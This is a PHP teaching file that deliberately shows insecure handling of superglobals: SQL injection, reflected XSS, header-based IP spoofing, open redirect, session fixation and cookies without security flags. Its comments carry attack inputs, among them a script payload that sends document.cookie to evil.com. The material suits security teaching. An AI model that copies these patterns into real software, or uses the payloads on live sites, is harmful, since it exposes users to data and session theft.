<?php
/**
 * Day 13: Arrays & Superglobals Security — VULNERABLE EXAMPLES
 * 
 * ❌ NEVER use any of these patterns in production.
 * This file demonstrates what NOT to do with PHP superglobals.
 * 
 * CWEs illustrated:
 * - CWE-89  (SQL Injection via raw $_GET)
 * - CWE-79  (XSS via raw output of $_GET)
 * - CWE-290 (IP spoofing via HTTP_CLIENT_IP)
 * - CWE-384 (Session fixation — no regenerate_id)
 * - CWE-601 (Open redirect via HTTP_HOST)
 * - CWE-1004 (Cookie without HttpOnly)
 */

// ❌ 1. Direct superglobal use without validation — SQLi + XSS waiting to happen
$userId   = $_GET['user_id'];      // raw, untyped, unvalidated
$username = $_POST['username'];    // could be anything
$search   = $_GET['q'];            // reflected XSS entry point

// Direct DB query with raw input — SQL Injection (CWE-89)
$pdo = new PDO("mysql:host=localhost;dbname=app", "root", "");
$query = "SELECT * FROM users WHERE id = $userId";
// Attack: ?user_id=1 OR 1=1--  → dumps entire users table
$result = $pdo->query($query);

// Reflected XSS (CWE-79)
// Attack: ?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
echo "<h1>Results for: $search</h1>";

// ❌ 2. Trusting $_SERVER for security decisions — IP spoofing (CWE-290)
$ip = $_SERVER['HTTP_CLIENT_IP'] 
    ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
    ?? $_SERVER['REMOTE_ADDR'];
// Attacker sends: X-Forwarded-For: 127.0.0.1
// → bypasses IP allowlist for admin panel
if ($ip === '127.0.0.1') {
    grantAdminAccess(); // ❌ trivially bypassed
}

// ❌ 3. Using $_REQUEST (merges GET+POST+COOKIE — parameter pollution)
$action = $_REQUEST['action'];  // attacker may override POST values with GET params

// ❌ 4. Trusting $_SERVER['HTTP_HOST'] for redirects — open redirect (CWE-601)
$host = $_SERVER['HTTP_HOST'];  // attacker-controlled header
header("Location: https://$host/dashboard");
// Attack: Host: evil.com → user is redirected to attacker's site

// ❌ 5. Session fixation (CWE-384)
// PHP accepts PHPSESSID from URL if session.use_only_cookies = Off (default in older PHP)
session_start();
// Attacker sends: GET /login.php?PHPSESSID=attackerknowsthisid
// After victim logs in with this known session ID, attacker reuses it
$_SESSION['user'] = $username; // session hijacked — attacker shares this session!

// ❌ 6. Unvalidated cookie value for privilege check
$role = $_COOKIE['role'];       // trivially forged in browser DevTools
if ($role === 'admin') {
    showAdminPanel();           // any user can set their own cookie to 'admin'
}

// ❌ 7. Cookie set without security flags (CWE-1004)
setcookie('session_token', 'abc123', time() + 3600);
// No secure=true  → sent over HTTP (eavesdropping)
// No httponly=true → readable via JavaScript (XSS cookie theft)
// No samesite    → CSRF attacks can include this cookie

function grantAdminAccess(): void { echo "Admin access granted!\n"; }
function showAdminPanel(): void    { echo "Welcome, admin!\n"; }
